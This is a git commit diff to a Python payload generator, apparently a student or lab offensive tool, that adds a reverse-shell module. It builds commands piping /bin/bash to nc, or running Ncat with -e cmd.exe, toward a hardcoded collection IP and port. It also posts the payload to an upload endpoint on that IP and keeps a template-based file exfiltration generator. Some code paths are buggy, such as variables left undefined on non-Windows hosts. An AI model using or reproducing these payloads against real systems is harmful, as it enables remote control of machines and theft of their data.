be23dfac3af135cb31eb256ef8f0748d2796518b
Mitchell Davies <mitchbd98@gmail.com>
2021-02-13 16:20:35 -0600

    Made the RShell payload module

--- PayloadGenerator.py
+++ PayloadGenerator.py
@@ -9,7 +9,7 @@ def main():
     parser.add_argument('-i', type=str, default="131.151.162.100", help='collection ip address', dest='collectionIP', required=False)
     parser.add_argument('-r', type=str, default=1234, help='collection port', dest='collectionPort', required=False)
     #parser.add_argument('-f', type=str, default=None, help='File you wish to exfil', dest='exfilFile', required=True)
-    #parser.add_argument('-a', type=str, default=None, help='Target architecture: ubuntux86', dest='targetArch', required=True)
+    parser.add_argument('-a', type=str, default="ubuntux86", help='Target architecture: ubuntux86', dest='targetArch', required=False)
 
     #Optional arguments
     #parser.add_argument('-o', type=str, default="execute-command.sh", help='Payload output name', dest='payloadName', required=False)
@@ -17,15 +17,15 @@ def main():
     args = parser.parse_args()
 
     systemVariables = {'OS': platform.system(),
-                        'NCat': 'NCat' if platform.system() == 'Windows' else 'nc',
+                        'Ncat': 'Ncat' if platform.system() == 'Windows' else 'Ncat',
                         'Shell': ''}
 
     #Reverse Shell Payload
     if(args.payloadChoice == "RShell"):
         print("Reverse Shell payload generator.")
-        shellDestination = "http://localhost:63412/upload"
+        shellDestination = "http://131.151.162.100:63412/upload"
         variables = "pass=abc321&payload="
-        ReverseShell(systemVariables, args.collectionIP, args.collectionPort, shellDestination, variables, "file.cmd")
+        ReverseShell(systemVariables, args.collectionIP, args.collectionPort, shellDestination, variables, args.targetArch)
 
     #Command Execution Payload
     if(args.payloadChoice == "CExe"):
@@ -47,23 +47,28 @@ def main():
 
     return
 
-def ReverseShell(systemVariables, collectionIP, collectionPort, shellDestination, variables, payloadName):
+def ReverseShell(systemVariables, collectionIP, collectionPort, shellDestination, variables, targetArch):
     if(systemVariables['OS'] == 'Windows'):
         newShell = "start cmd.exe @cmd /k"
-        localNetCat = f'{systemVariables["NCat"]} -l -p {collectionPort}'
-        shellVar = "cmd.exe"
-    with open('CMDTemplates/RShell', 'r') as file:
-        RShellPayloadText = file.read().format(newShell, localNetCat, variables, collectionIP, collectionPort, shellVar, shellDestination)
+        localNetCat = f'{systemVariables["Ncat"]} -l -p {collectionPort}'
+    if(targetArch == "ubuntux86"):
+        payload = "/bin/bash | nc {0} {1}".format(collectionIP, collectionPort)
+    elif(targetArch == "Windows"):
+        payload = "Ncat {0} {1} -e cmd.exe".format(collectionIP, collectionPort)
 
-    f = open(payloadName, "w")
+    with open('CMDTemplates/RShell', 'r') as file:
+        RShellPayloadText = file.read().format(newShell, localNetCat, variables, payload.replace(' ', '%20'), shellDestination)
+
+    f = open("RShell.cmd", "w")
     f.write(RShellPayloadText)
     f.close()
     return
 
-def GenExfil(exfilFile, collectionIP, collectionPort, payloadName):
+def GenExfil(exfilFile, collectionIP, collectionPort):
     with open('CMDTemplates/Exfil', 'r') as file:
         ExfilPayloadText = file.read().format(exfilFile, collectionIP, collectionPort)
-    f = open(payloadName, "w")
+
+    f = open("Exfil", "w")
     f.write(ExfilPayloadText)
     f.close()
     return
